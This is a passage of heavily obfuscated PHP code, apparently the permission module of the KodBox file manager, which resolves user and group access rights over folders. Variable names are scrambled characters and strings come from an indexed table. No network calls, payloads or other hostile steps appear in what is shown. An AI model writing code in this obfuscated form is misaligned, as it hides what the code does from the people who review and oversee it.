} foreach ($’›†İ‘Ô as $Ó˜Ä„“Ô) { $ßÙ¦‹À = array(); foreach ($Ó˜Ä„“Ô[$›îê»İâ[2075]] as $ÊİçÙË·) { $Û÷½®Ú  = $ÊİçÙË·[$›îê»İâ[519]]; $Øší©ñÇ = $ÊİçÙË·[$›îê»İâ[1693]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $»ÄÄŸˆÊ = $ÊİçÙË·[$›îê»İâ[1693]] ? $ÊİçÙË·[$›îê»İâ[1693]] : $ÊİçÙË·[$›îê»İâ[1891]]; if ($ÊİçÙË·[$›îê»İâ[1693]] && $ÊİçÙË·[$›îê»İâ[1693]] == $¾ïã²€Õ) { continue; } $ßÙ¦‹À[] = array($›îê»İâ[193] => $Ó˜Ä„“Ô[$›îê»İâ[193]], $›îê»İâ[190] => $Øší©ñÇ, $›îê»İâ[549] => intval($»ÄÄŸˆÊ), $›îê»İâ[1995] => isset($Û÷½®Ú [$›îê»İâ[454]]) ? intval($Û÷½®Ú [$›îê»İâ[454]]) : 0, $›îê»İâ[2055] => isset($Û÷½®Ú [$›îê»İâ[2055]]) ? intval($Û÷½®Ú [$›îê»İâ[2055]]) : -1); } $ßÙ¦‹À[] = array($›îê»İâ[193] => $Ó˜Ä„“Ô[$›îê»İâ[193]], $›îê»İâ[190] => SourceModel::TYPE_USER, $›îê»İâ[549] => intval($¾ïã²€Õ), $›îê»İâ[1995] => intval($§Éö²ë·), $›îê»İâ[2055] => -1); $this->where(array($›îê»İâ[470] => $Ó˜Ä„“Ô[$›îê»İâ[193]]))->delete(); $this->addAll($ßÙ¦‹À); } return !0; } public function get($¡â“‹š) { $ÕàÎü‚ = $this->getSourceList(array($¡â“‹š), !0); return $ÕàÎü‚[0]; } public function getSourceList($Ÿ†ÃÛÖº, $³ÏÌ§“Ï = false, $©íÜÛ‰ø = false) { $¬¬íáÌÜ =& $_SERVER[•€áå–Õ]; if (!$Ÿ†ÃÛÖº) { return array(); } $ƒ¾ù‹ = Model($¬¬íáÌÜ[1374]); if (!$³ÏÌ§“Ï && count($Ÿ†ÃÛÖº) == 1) { $³ÏÌ§“Ï = array(); $³ÏÌ§“Ï[$Ÿ†ÃÛÖº[0]] = $ƒ¾ù‹->sourceInfo($Ÿ†ÃÛÖº[0]); } if (!$³ÏÌ§“Ï) { $Ğ—Êµ­“ = array($¬¬íáÌÜ[470] => array($¬¬íáÌÜ[471], $Ÿ†ÃÛÖº)); $³ÏÌ§“Ï = $ƒ¾ù‹->field($¬¬íáÌÜ[2079])->where($Ğ—Êµ­“)->select(); $³ÏÌ§“Ï = array_to_keyvalue($³ÏÌ§“Ï, $¬¬íáÌÜ[193]); } $ä¶ß’¢ = $Ÿ†ÃÛÖº; foreach ($³ÏÌ§“Ï as $ÙÚ¢ÇóÏ => $ÇÕ‚Á•¦) { $ãİ¡¹û = $ƒ¾ù‹->parentLevelArray($ÇÕ‚Á•¦[$¬¬íáÌÜ[564]]); $ä¶ß’¢ = array_merge($ä¶ß’¢, array($ÙÚ¢ÇóÏ), array_reverse($ãİ¡¹û)); } $ä¶ß’¢ = array_values(array_unique($ä¶ß’¢)); if (!$ä¶ß’¢) { return array(); } $¬•ñÀ§Ó = $this->sourceAuthSelect($ä¶ß’¢); $Í­˜èìÀ = array(); foreach ($ä¶ß’¢ as $÷»ù„£) { if (isset($¬•ñÀ§Ó[$÷»ù„£])) { $Í­˜èìÀ[$÷»ù„£] = $¬•ñÀ§Ó[$÷»ù„£]; } } $ìÂ™·çÃ = $this->userIsRoot($©íÜÛ‰ø); $èé–´á§ = AuthModel::authAll(); $ÚŸØœõ = array($¬¬íáÌÜ[467] => $èé–´á§, $¬¬íáÌÜ[2080] => array($¬¬íáÌÜ[472] => 0, $¬¬íáÌÜ[1897] => $èé–´á§, $¬¬íáÌÜ[473] => LNG($¬¬íáÌÜ[2081]), $¬¬íáÌÜ[1914] => $¬¬íáÌÜ[2082])); $²£åè¯ş = array(); foreach ($³ÏÌ§“Ï as $÷»ù„£ => $ï«ŒÕî¶) { if ($ìÂ™·çÃ && $GLOBALS[$¬¬íáÌÜ[16]][$¬¬íáÌÜ[1910]]) { $²£åè¯ş[$÷»ù„£] = $ÚŸØœõ; continue; } $²£åè¯ş[$÷»ù„£] = $this->makeSourceAuth($ï«ŒÕî¶, $Í­˜èìÀ, $©íÜÛ‰ø); } return $²£åè¯ş; } public function authDeepCheck($…ÍğÒÂ©, $­Ø´ = false) { $ƒ’å«¡° =& $_SERVER[•€áå–Õ]; $­Ø´ = $­Ø´ ? $­Ø´ : USER_ID; $³•¶”ã = $this->makeAuthDeep($­Ø´); if (!in_array($…ÍğÒÂ©, $³•¶”ã[$ƒ’å«¡°[2083]])) { return !1; } $İÂÀééÌ = array(); foreach ($³•¶”ã[$ƒ’å«¡°[2084]] as $ ¨§³ÎØ => $ËÓ¦Ô›) { if (!in_array($…ÍğÒÂ©, $ËÓ¦Ô›)) { continue; } $İÂÀééÌ[] = $ ¨§³ÎØ; } if (!$İÂÀééÌ) { return !1; } $óçã¼ê– = $İÂÀééÌ ? $İÂÀééÌ[0] : $…ÍğÒÂ©; return array($ƒ’å«¡°[467] => -1, $ƒ’å«¡°[519] => array($ƒ’å«¡°[472] => $ƒ’å«¡°[1229], $ƒ’å«¡°[1897] => $ƒ’å«¡°[224], $ƒ’å«¡°[473] => LNG($ƒ’å«¡°[2085]), $ƒ’å«¡°[1914] => $ƒ’å«¡°[2086]), $ƒ’å«¡°[2087] => LNG($ƒ’å«¡°[2088]), $ƒ’å«¡°[2089] => $this->sourceAuthInfo($óçã¼ê–)); } protected function makeAuthDeep($Ç‰²Î•Œ = false) { $®é’¹Ö =& $_SERVER[•€áå–Õ]; static $±ıäµ­» = array(); $Ç‰²Î•Œ = $Ç‰²Î•Œ ? $Ç‰²Î•Œ : USER_ID; if (isset($±ıäµ­»[$Ç‰²Î•Œ])) { return $±ıäµ­»[$Ç‰²Î•Œ]; } $Û  •éË = Model($®é’¹Ö[2090])->listData(); $ô±…ô›Ô = array(); foreach ($Û  •éË as $ÃßİÜ¾å) { if ($ÃßİÜ¾å[$®é’¹Ö[466]] == 0 && $ÃßİÜ¾å[$®é’¹Ö[1913]] == $®é’¹Ö[100]) { $ô±…ô›Ô[] = $ÃßİÜ¾å[$®é’¹Ö[454]]; } } $²ÇµÕ°ä = $this->userGroupParents($Ç‰²Î•Œ); $”³ÌøÃ = array($®é’¹Ö[190] => SourceModel::TYPE_USER, $®é’¹Ö[549] => $Ç‰²Î•Œ); if ($²ÇµÕ°ä) { $”³ÌøÃ = array(array($®é’¹Ö[190] => SourceModel::TYPE_USER, $®é’¹Ö[549] => $Ç‰²Î•Œ), array($®é’¹Ö[190] => SourceModel::TYPE_GROUP, $®é’¹Ö[549] => array($®é’¹Ö[471], $²ÇµÕ°ä)), $®é’¹Ö[1041] => $®é’¹Ö[1989]); } $Ä½³÷Â˜ = $this->field($®é’¹Ö[2091])->where($”³ÌøÃ)->select(); $Ì¨®şâ = array(); $€¦šÎŒ® = array_to_keyvalue_group($Ä½³÷Â˜, $®é’¹Ö[193]); foreach ($€¦šÎŒ® as $Å£âªÎ => $ùãÂ…Éá) { $ş®¸¹¶¬ = $this->authArrayCheck($ùãÂ…Éá, $Ç‰²Î•Œ); if ($ş®¸¹¶¬[$®é’¹Ö[467]] > 0) { $Ì¨®şâ[] = $Å£âªÎ . $®é’¹Ö[22]; } } if ($²ÇµÕ°ä) { $¼°éş—¬ = Model($®é’¹Ö[565]); foreach ($²ÇµÕ°ä as $‘óãÜ) { $Ò—ùÔëÅ = $¼°éş—¬->getInfo($‘óãÜ); if (!$Ò—ùÔëÅ || !is_array($Ò—ùÔëÅ[$®é’¹Ö[99]])) { continue; } $Ì¨®şâ[] = $Ò—ùÔëÅ[$®é’¹Ö[99]][$®é’¹Ö[193]]; } } $Ğüéø = array(); $Ëº­ß÷ƒ = $²ÇµÕ°ä; $øÆœ€›Ú = Model($®é’¹Ö[1374]); $¼°éş—¬ = Model($®é’¹Ö[565]); $öİé†‰¾ = array(); $ªãÀ—ãÃ = array(); $¼é©¡¯ = array(); $šˆ†µû = array(); if ($Ì¨®şâ) { $ß©¼ÆÚ = $øÆœ€›Ú->where(array($®é’¹Ö[193] => array($®é’¹Ö[471], $Ì¨®şâ)))->select(); foreach ($ß©¼ÆÚ as $ì§Ï–ÑÏ) { $ªæ˜óñ = $øÆœ€›Ú->parentLevelArray($ì§Ï–ÑÏ[$®é’¹Ö[564]]); $Ğüéø = array_merge($Ğüéø, $ªæ˜óñ); $Ëº­ß÷ƒ[] = $ì§Ï–ÑÏ[$®é’¹Ö[549]]; $öİé†‰¾[$ì§Ï–ÑÏ[$®é’¹Ö[193]]] = $ªæ˜óñ; $ªãÀ—ãÃ[$ì§Ï–ÑÏ[$®é’¹Ö[193]]] = $ì§Ï–ÑÏ[$®é’¹Ö[549]]; } } $Ëº­ß÷ƒ = array_values(array_unique($Ëº­ß÷ƒ)); $ÑÖËœé = $Ëº­ß÷ƒ; foreach ($ÑÖËœé as $‘óãÜ) { $Ò—ùÔëÅ = $¼°éş—¬->getInfo($‘óãÜ); $ªæ˜óñ = $øÆœ€›Ú->parentLevelArray($Ò—ùÔëÅ[$®é’¹Ö[564]]); $Ëº­ß÷ƒ = array_merge($Ëº­ß÷ƒ, $ªæ˜óñ); } $Ëº­ß÷ƒ = array_values(array_unique($Ëº­ß÷ƒ)); foreach ($Ëº­ß÷ƒ as $‘óãÜ) { $Ò—ùÔëÅ = $¼°éş—¬->getInfo($‘óãÜ); $Ğüéø[] = $Ò—ùÔëÅ[$®é’¹Ö[99]][$®é’¹Ö[193]]; $¼é©¡¯[$‘óãÜ] = $Ò—ùÔëÅ[$®é’¹Ö[99]][$®é’¹Ö[193]]; $šˆ†µû[$‘óãÜ] = $øÆœ€›Ú->parentLevelArray($Ò—ùÔëÅ[$®é’¹Ö[564]]); } foreach ($öİé†‰¾ as $Û½‚ªÎ => $ÈÊ›€÷Õ) { $Ö¡«˜Ñæ = $ªãÀ—ãÃ[$Û½‚ªÎ]; if (!$Ö¡«˜Ñæ || !$¼é©¡¯[$Ö¡«˜Ñæ]) { continue; } $©õûßê = array(); foreach ($šˆ†µû[$Ö¡«˜Ñæ] as $‘óãÜ) { $©õûßê[] = $¼é©¡¯[$‘óãÜ]; } $öİé†‰¾[$Û½‚ªÎ] = array_merge($©õûßê, $ÈÊ›€÷Õ); } $Ğüéø = array_values(array_unique($Ğüéø)); $Çç“¿¸ = array($®é’¹Ö[2083] => $Ğüéø, $®é’¹Ö[2084] => $öİé†‰¾); $±ıäµ­»[$Ç‰²Î•Œ] = $Çç“¿¸; return $Çç“¿¸; } private function makeSourceAuth($ÓÛîİŠ, $ªîíå§, $‰º¸Œ…‰ = false) { $²ôÃÅÏ˜ =& $_SERVER[•€áå–Õ]; $çîû§ö® = $²ôÃÅÏ˜[100]; $·óºäÒ– = $ÓÛîİŠ[$²ôÃÅÏ˜[549]]; $ì³ï›¡Ä = $ÓÛîİŠ[$²ôÃÅÏ˜[190]] == SourceModel::TYPE_GROUP; $¸ÈÁ¹ı = $ì³ï›¡Ä ? $this->groupRootAuth($·óºäÒ–, $‰º¸Œ…‰) : !1; if ($¸ÈÁ¹ı && Model($²ôÃÅÏ˜[551])->authCheckAction($¸ÈÁ¹ı[$²ôÃÅÏ˜[466]], $²ôÃÅÏ˜[1912])) { return $this->groupAuthInfo($¸ÈÁ¹ı, $·óºäÒ–); } $ß¦Ø‹î† = Model($²ôÃÅÏ˜[1374])->parentLevelArray($ÓÛîİŠ[$²ôÃÅÏ˜[564]]); $ß¦Ø‹î† = array_merge(array($ÓÛîİŠ[$²ôÃÅÏ˜[193]]), array_reverse($ß¦Ø‹î†)); $šŠÓà¯ˆ = !1; foreach ($ß¦Ø‹î† as $‡Ë±Ä™) { if (!isset($ªîíå§[$‡Ë±Ä™])) { continue; } $ü·–‹« = $this->authMake($ªîíå§[$‡Ë±Ä™], $‰º¸Œ…‰); if ($ü·–‹«[$²ôÃÅÏ˜[519]]) { $šŠÓà¯ˆ = $ü·–‹«; break; } } if (!$ì³ï›¡Ä) { return $šŠÓà¯ˆ; } if (!$šŠÓà¯ˆ && $¸ÈÁ¹ı) { $šŠÓà¯ˆ = $this->groupAuthInfo($¸ÈÁ¹ı, $·óºäÒ–); } if (!$šŠÓà¯ˆ) { $î¸¯ùúÍ = Model($²ôÃÅÏ˜[565])->getInfo($·óºäÒ–); $ô£›Ş‹¸ = explode($²ôÃÅÏ˜[60], trim($î¸¯ùúÍ[$²ôÃÅÏ˜[564]], $²ôÃÅÏ˜[60])); $ô£›Ş‹¸ = array_reverse($ô£›Ş‹¸); foreach ($ô£›Ş‹¸ as $¯²Ú¥ Ø) { if ($¯²Ú¥ Ø == $²ôÃÅÏ˜[224] || $¯²Ú¥ Ø == $çîû§ö®) { continue; } $²²ûÛµ÷ = $this->groupRootAuth($¯²Ú¥ Ø, $‰º¸Œ…‰); if (!$²²ûÛµ÷) { continue; } $šŠÓà¯ˆ = $this->groupAuthInfo($²²ûÛµ÷, $¯²Ú¥ Ø); break; } } if (!$šŠÓà¯ˆ || $šŠÓà¯ˆ[$²ôÃÅÏ˜[467]] <= 0) { $Öˆ“Š‘­ = $this->authDeepCheck($ÓÛîİŠ[$²ôÃÅÏ˜[193]], $‰º¸Œ…‰); if ($Öˆ“Š‘­) { $šŠÓà¯ˆ = $Öˆ“Š‘­; } } return $šŠÓà¯ˆ; } private function userIsRoot($¥Øë“Öò = false) { $¢à‘õ‚æ =& $_SERVER[•€áå–Õ]; if (!$¥Øë“Öò && KodUser::isRoot()) { return !0; } $ùüÙà½ = Model($¢à‘õ‚æ[578])->getInfo($¥Øë“Öò); $£ª…‡ = Model($¢à‘õ‚æ[2092])->listData($ùüÙà½[$¢à‘õ‚æ[2093]]); if ($£ª…‡ && $£ª…‡[$¢à‘õ‚æ[555]][$¢à‘õ‚æ[2094]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ö£û±ÌŸ) { $€Š‘Ñ¡ =& $_SERVER[•€áå–Õ]; $½Ğ¶ñ© = Model($€Š‘Ñ¡[1374]); $Ÿ¼İæÑÏ = $½Ğ¶ñ©->sourceInfo($ö£û±ÌŸ); if (!$Ÿ¼İæÑÏ) { return !1; } $½Ğ¶ñ©->groupPathDisplay($Ÿ¼İæÑÏ); $ÔŸÉŸŞ = array($Ÿ¼İæÑÏ); $ÔŸÉŸŞ = $½Ğ¶ñ©->_listAppendPath($ÔŸÉŸŞ); $Ÿ¼İæÑÏ = $ÔŸÉŸŞ[0]; $™Û«ÓÉ™ = $Ÿ¼İæÑÏ[$€Š‘Ñ¡[562]]; if (isset($Ÿ¼İæÑÏ[$€Š‘Ñ¡[570]])) { $ÄŸš³³ = explode($€Š‘Ñ¡[18], trim($Ÿ¼İæÑÏ[$€Š‘Ñ¡[562]], $€Š‘Ñ¡[18])); array_shift($ÄŸš³³); $™Û«ÓÉ™ = $Ÿ¼İæÑÏ[$€Š‘Ñ¡[568]] . $€Š‘Ñ¡[2095] . implode($€Š‘Ñ¡[18], $ÄŸš³³); } return array($€Š‘Ñ¡[473] => $Ÿ¼İæÑÏ[$€Š‘Ñ¡[42]], $€Š‘Ñ¡[96] => KodIO::make($Ÿ¼İæÑÏ[$€Š‘Ñ¡[193]]), $€Š‘Ñ¡[2096] => $™Û«ÓÉ™); } private function groupAuthInfo($ùÒï‚ß§, $¶¸Çæë) { $¢ê¸ŠÔï =& $_SERVER[•€áå–Õ]; $Çå”ç”ø = Model($¢ê¸ŠÔï[565])->getInfo($¶¸Çæë); return array($¢ê¸ŠÔï[2097] => intval($ùÒï‚ß§[$¢ê¸ŠÔï[466]]), $¢ê¸ŠÔï[2080] => $ùÒï‚ß§, $¢ê¸ŠÔï[2098] => LNG($¢ê¸ŠÔï[2099]), $¢ê¸ŠÔï[2089] => array($¢ê¸ŠÔï[473] => $Çå”ç”ø[$¢ê¸ŠÔï[42]], $¢ê¸ŠÔï[96] => KodIO::make($Çå”ç”ø[$¢ê¸ŠÔï[99]][$¢ê¸ŠÔï[193]]), $¢ê¸ŠÔï[2096] => $Çå”ç”ø[$¢ê¸ŠÔï[569]])); } protected function groupRootAuth($”Êğí˜È, $ÍÑß·„ = false) { $“¶€ö‡ =& $_SERVER[•€áå–Õ]; $ÍÑß·„ = $ÍÑß·„ ? $ÍÑß·„ : USER_ID; $¦İ‡›˜ñ = $ÍÑß·„ . $“¶€ö‡[2100] . $”Êğí˜È; static $ì—€÷¶å = array(); if (isset($ì—€÷¶å[$¦İ‡›˜ñ])) { return $ì—€÷¶å[$¦İ‡›˜ñ]; } $‘½ª«Ş = Model($“¶€ö‡[565])->getInfo($”Êğí˜È); $û™«„¹ = $this->userGroupList($ÍÑß·„); $¥™¥¼¥ô = isset($û™«„¹[$”Êğí˜È]) ? $û™«„¹[$”Êğí˜È][$“¶€ö‡[466]] : !1; if ($¥™¥¼¥ô && Model($“¶€ö‡[551])->authCheckAction($¥™¥¼¥ô[$“¶€ö‡[466]], $“¶€ö‡[1912])) { $ì—€÷¶å[$¦İ‡›˜ñ] = $¥™¥¼¥ô; return $¥™¥¼¥ô; } $²¨Ö‚ı = $this->sourceAuthSelect($‘½ª«Ş[$“¶€ö‡[99]][$“¶€ö‡[193]]); $ùæŒ®£Ó = $²¨Ö‚ı ? $this->authMake($²¨Ö‚ı, $ÍÑß·„) : !1; $â»ƒš­ = $ùæŒ®£Ó ? $ùæŒ®£Ó[$“¶€ö‡[519]] : !1; $ì—€÷¶å[$¦İ‡›˜ñ] = $â»ƒš­ ? $â»ƒš­ : $¥™¥¼¥ô; return $ì—€÷¶å[$¦İ‡›˜ñ]; } public function authOwnerApply($­¢Ïë¶Ú) { $˜Ø¤ãÎÈ =& $_SERVER[•€áå–Õ]; if (empty($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[466]]) || isset($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[2101]]) && $­¢Ïë¶Ú[$˜Ø¤ãÎÈ[2101]]) { return $­¢Ïë¶Ú; } if (AuthModel::authCheckRoot($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[466]][$˜Ø¤ãÎÈ[467]])) { return $­¢Ïë¶Ú; } $£ö¾­¥ = Model($˜Ø¤ãÎÈ[1374])->parentLevelArray($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[564]]); $£ö¾­¥ = array_merge(array($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[193]]), array_reverse($£ö¾­¥)); $½„Äªƒ¯ = $this->sourceAuthSelect($£ö¾­¥); $Ş‚Ÿ½î¶ = array(); $¾áò±“¤ = array(); foreach ($½„Äªƒ¯ as $·àë¢ôÓ => $ı¼Â¬“ ) { $ßé‘ìÇ· = $this->authFolderOwnerUser($ı¼Â¬“ ); $Ş‚Ÿ½î¶[$·àë¢ôÓ] = $ßé‘ìÇ·; $¾áò±“¤ = array_merge($¾áò±“¤, $ßé‘ìÇ·[$˜Ø¤ãÎÈ[641]]); if ($ßé‘ìÇ·[$˜Ø¤ãÎÈ[2102]]) { break; } } if (count($¾áò±“¤) == 0) { $¾áò±“¤ = $this->authFolderOwnerGroup($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[549]]); } $¾áò±“¤ = array_unique($¾áò±“¤); if (AuthModel::authCheckRoot($­¢Ïë¶Ú[$˜Ø¤ãÎÈ[466]][$˜Ø¤ãÎÈ[467]])) { $¾áò±“¤[] = USER_ID; } $­¢Ïë¶Ú[$˜Ø¤ãÎÈ[466]][$˜Ø¤ãÎÈ[2103]] = Model($˜Ø¤ãÎÈ[557])->userListInfo($¾áò±“¤); return $­¢Ïë¶Ú; } private function authFolderOwnerGroup($ö¨Öı¼È) { $§¨Ó„éà =& $_SERVER[•€áå–Õ]; $ÂÄ™ÎÜà = Model($§¨Ó„éà[1981])->where(array($§¨Ó„éà[1891] => $ö¨Öı¼È))->select(); $˜ˆ½°«¥ = array(); if (!$ÂÄ™ÎÜà) { return $˜ˆ½°«¥; } foreach ($ÂÄ™ÎÜà as $©–åËèº) { $’ÄÑÒ¤û = $this->authInfo($©–åËèº); if (AuthModel::authCheckRoot($’ÄÑÒ¤û[$§¨Ó„éà[466]])) { $˜ˆ½°«¥[] = $©–åËèº[$§¨Ó„éà[1693]]; } } return $˜ˆ½°«¥; } private function authFolderOwnerUser($——ø¼‚Ñ) { $÷îµ¼ŠÛ =& $_SERVER[•€áå–Õ]; $›Ïğ¥‰© = array(); $ØŞæ–¢Ø = !1; foreach ($——ø¼‚Ñ as $ÀœñÉœ÷) { $¸§ñ¯• = $this->authInfo($ÀœñÉœ÷); if ($ÀœñÉœ÷[$÷îµ¼ŠÛ[549]] == $÷îµ¼ŠÛ[224]) { $ØŞæ–¢Ø = !0; } if ($ÀœñÉœ÷[$÷îµ¼ŠÛ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¸§ñ¯•[$÷îµ¼ŠÛ[466]])) { $›Ïğ¥‰©[] = $ÀœñÉœ÷[$÷îµ¼ŠÛ[549]]; } } } return array($÷îµ¼ŠÛ[641] => $›Ïğ¥‰©, $÷îµ¼ŠÛ[2102] => $ØŞæ–¢Ø); } public function authMake($ĞÛ‡ºª, $ÃöÚÎâ° = false) { $•š€¯¾• =& $_SERVER[•€áå–Õ]; $ä˜€‡« = $this->authArrayCheck($ĞÛ‡ºª, $ÃöÚÎâ°); if ($ä˜€‡«[$•š€¯¾•[2104]]) { $ä˜€‡«[$•š€¯¾•[2104]] = $this->sourceAuthInfo($ä˜€‡«[$•š€¯¾•[2104]]); } return $ä˜€‡«; } public function authArrayCheck($–úé²ã, $’¹©Î§– = false) { $¾¹¼€Ú“ =& $_SERVER[•€áå–Õ]; if (!$–úé²ã) { return array($¾¹¼€Ú“[467] => 0, $¾¹¼€Ú“[519] => !1); } $’¹©Î§– = $’¹©Î§– ? $’¹©Î§– : USER_ID; $‰¥¾Ö–ï = 0; $ßÍ·Î¤ = 0; $Ù˜ş¹™Ğ = 0; $ıĞ€–ã = 0; $É¤ƒ’Á = 0; $¨«¾Ï†Í = 0; $ì˜®Şàš = 1000; $¹ÜªíŸ¸ = 0; $ë³’¹„İ = 0; $ëÆŒ¡œç = 0; $ÔÊğÁÖ³ = 0; $ã•Ä… = array($¾¹¼€Ú“[193] => 0); foreach ($–úé²ã as $ã•Ä…) { $ê¦Ê‘óõ = $this->authInfo($ã•Ä…); if (!$ê¦Ê‘óõ) { continue; } $Ü©ğıë = $ã•Ä…[$¾¹¼€Ú“[549]]; $Ø­áİ«¡ = intval($ê¦Ê‘óõ[$¾¹¼€Ú“[466]]); if ($ã•Ä…[$¾¹¼€Ú“[190]] == SourceModel::TYPE_USER && $Ü©ğıë == $’¹©Î§–) { $‰¥¾Ö–ï = !0; $Ù˜ş¹™Ğ = $ê¦Ê‘óõ; $ßÍ·Î¤ = $Ø­áİ«¡; } else { if ($ã•Ä…[$¾¹¼€Ú“[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ü©ğıë, $’¹©Î§–)) { $ıĞ€–ã = !0; $›ëñáˆ = $this->groupStepToUserGroup($Ü©ğıë, $’¹©Î§–); if ($›ëñáˆ < $ì˜®Şàš) { $ì˜®Şàš = $›ëñáˆ; $É¤ƒ’Á = $Ø­áİ«¡; $¨«¾Ï†Í = $ê¦Ê‘óõ; $¹ÜªíŸ¸ = $Ü©ğıë; } if ($›ëñáˆ == $ì˜®Şàš && $Ø­áİ«¡ >= $É¤ƒ’Á) { $É¤ƒ’Á = $Ø­áİ«¡; $¨«¾Ï†Í = $ê¦Ê‘óõ; $¹ÜªíŸ¸ = $Ü©ğıë; } } else { if ($Ü©ğıë == $¾¹¼€Ú“[224]) { $ë³’¹„İ = !0; $ÔÊğÁÖ³ = $ê¦Ê‘óõ; $ëÆŒ¡œç = $Ø­áİ«¡; } } } } if ($‰¥¾Ö–ï) { $©×¨ƒÆò = $ßÍ·Î¤; $ê¦Ê‘óõ = $Ù˜ş¹™Ğ; $êëÍ¶ìÖ = LNG($¾¹¼€Ú“[2105]); } else { if ($ıĞ€–ã) { $©×¨ƒÆò = $É¤ƒ’Á; $ê¦Ê‘óõ = $¨«¾Ï†Í; $¯’Œ¿±ì = Model($¾¹¼€Ú“[565])->getInfo($¹ÜªíŸ¸); $êëÍ¶ìÖ = $¾¹¼€Ú“[175] . $¯’Œ¿±ì[$¾¹¼€Ú“[569]] . $¾¹¼€Ú“[2106] . LNG($¾¹¼€Ú“[2107]); } else { if ($ë³’¹„İ) { $©×¨ƒÆò = $ëÆŒ¡œç; $ê¦Ê‘óõ = $ÔÊğÁÖ³; $êëÍ¶ìÖ = LNG($¾¹¼€Ú“[2077]); } else { $©×¨ƒÆò = 0; $ê¦Ê‘óõ = !1; $êëÍ¶ìÖ = $¾¹¼€Ú“[22]; } } } $ ùñŞ¿ = array($¾¹¼€Ú“[2097] => intval($©×¨ƒÆò), $¾¹¼€Ú“[2080] => $ê¦Ê‘óõ, $¾¹¼€Ú“[2098] => $êëÍ¶ìÖ, $¾¹¼€Ú“[2089] => $ã•Ä…[$¾¹¼€Ú“[193]]); return $ ùñŞ¿; } private function groupContainUser($ö¹¾¢¼, $Æä‹ã‰ı = false) { return in_array($ö¹¾¢¼, $this->userGroupParents($Æä‹ã‰ı)); } private function groupStepToUserGroup($®”˜£’, $›Ğ¬Áô« = false) { $™ÂÄÊó® =& $_SERVER[•€áå–Õ]; $Ÿ‘å„úË = $this->userGroupList($›Ğ¬Áô«); $ÆÈËäĞÆ = 1000; $óñŒàÖÍ = $GLOBALS[$™ÂÄÊó®[16]][$™ÂÄÊó®[101]][$™ÂÄÊó®[1994]] == 1; $ËïÎóô¯ = $óñŒàÖÍ ? 3 : 2; foreach ($Ÿ‘å„úË as $àÅïŞª´) { if ($àÅïŞª´[$™ÂÄÊó®[1891]] == $®”˜£’) { return 0; } $Ñœ€ËĞì = explode($™ÂÄÊó®[60], trim($àÅïŞª´[$™ÂÄÊó®[564]], $™ÂÄÊó®[60])); if ($Ñœ€ËĞì[0] == $™ÂÄÊó®[224] && count($Ñœ€ËĞì) > $ËïÎóô¯) { $å†êéÌÅ = array_reverse(array_slice($Ñœ€ËĞì, $ËïÎóô¯)); $ìÕ¸¿²¢ = array_search($®”˜£’, $å†êéÌÅ); if ($ìÕ¸¿²¢ !== !1 && $ìÕ¸¿²¢ + 1 <= $ÆÈËäĞÆ) { $ÆÈËäĞÆ = $ìÕ¸¿²¢ + 1; } } } return $ÆÈËäĞÆ; } private function userGroupList($¡€ø¤«– = false) { $‚‰’éÛà =& $_SERVER[•€áå–Õ]; static $£éÖß¢ = array(); if (isset($£éÖß¢[$¡€ø¤«–])) { return $£éÖß¢[$¡€ø¤«–]; } $ï¸ğôÔ = Model($‚‰’éÛà[578])->getInfo($¡€ø¤«–); $£éÖß¢[$¡€ø¤«–] = array_to_keyvalue($ï¸ğôÔ[$‚‰’éÛà[2078]], $‚‰’éÛà[1891]); return $£éÖß¢[$¡€ø¤«–]; } public function userGroupParents($Ş‚³Ü®Ó) { $Ÿ»æçğ =& $_SERVER[•€áå–Õ]; static $¡£ ãÜì = array(); $Ş‚³Ü®Ó = $Ş‚³Ü®Ó ? $Ş‚³Ü®Ó : USER_ID; if (isset($¡£ ãÜì[$Ş‚³Ü®Ó])) { return $¡£ ãÜì[$Ş‚³Ü®Ó]; } $µüæ÷Â = $this->userGroupList($Ş‚³Ü®Ó); $ÂÅ¼Ñğß = array(); $üÜÓÙŞë = $GLOBALS[$Ÿ»æçğ[16]][$Ÿ»æçğ[101]][$Ÿ»æçğ[1994]] == 1; $ßò±Äœ¢ = $üÜÓÙŞë ? 3 : 2; foreach ($µüæ÷Â as $ô°Ş¶¢) { $œ’ï¤®Î = array($ô°Ş¶¢[$Ÿ»æçğ[1891]]); $Ú‚ñõË = explode($Ÿ»æçğ[60], trim($ô°Ş¶¢[$Ÿ»æçğ[564]], $Ÿ»æçğ[60])); if ($Ú‚ñõË[0] == $Ÿ»æçğ[224] && count($Ú‚ñõË) > $ßò±Äœ¢) { $Í™Åà‡ = array_slice($Ú‚ñõË, $ßò±Äœ¢); $œ’ï¤®Î = array_merge($œ’ï¤®Î, array_reverse($Í™Åà‡)); } $ÂÅ¼Ñğß = array_merge($ÂÅ¼Ñğß, $œ’ï¤®Î); } $¡£ ãÜì[$Ş‚³Ü®Ó] = array_unique($ÂÅ¼Ñğß); return $¡£ ãÜì[$Ş‚³Ü®Ó]; } public function authTargetInfoMake($ê¢æ³Û¡) { $ï¹¥şƒ… =& $_SERVER[•€áå–Õ]; $íœ÷›¯è = array(); $íÎëáœ€ = array(); foreach ($ê¢æ³Û¡ as $¯ø€£Ø±) { if ($¯ø€£Ø±[$ï¹¥şƒ…[190]] == SourceModel::TYPE_USER) { $íœ÷›¯è[] = intval($¯ø€£Ø±[$ï¹¥şƒ…[549]]); } else { if ($¯ø€£Ø±[$ï¹¥şƒ…[190]] == SourceModel::TYPE_GROUP) { $íÎëáœ€[] = intval($¯ø€£Ø±[$ï¹¥şƒ…[549]]); } } } if ($íœ÷›¯è) { $íœ÷›¯è = Model($ï¹¥şƒ…[557])->userListInfo($íœ÷›¯è); } if ($íÎëáœ€) { $ƒÃ„ÚÈ = array($ï¹¥şƒ…[1979] => array($ï¹¥şƒ…[471], $íÎëáœ€)); $íÎëáœ€ = Model($ï¹¥şƒ…[565])->field($ï¹¥şƒ…[2108])->where($ƒÃ„ÚÈ)->select(); $íÎëáœ€ = array_to_keyvalue($íÎëáœ€, $ï¹¥şƒ…[1891]); } return array($ï¹¥şƒ…[2109] => $íœ÷›¯è, 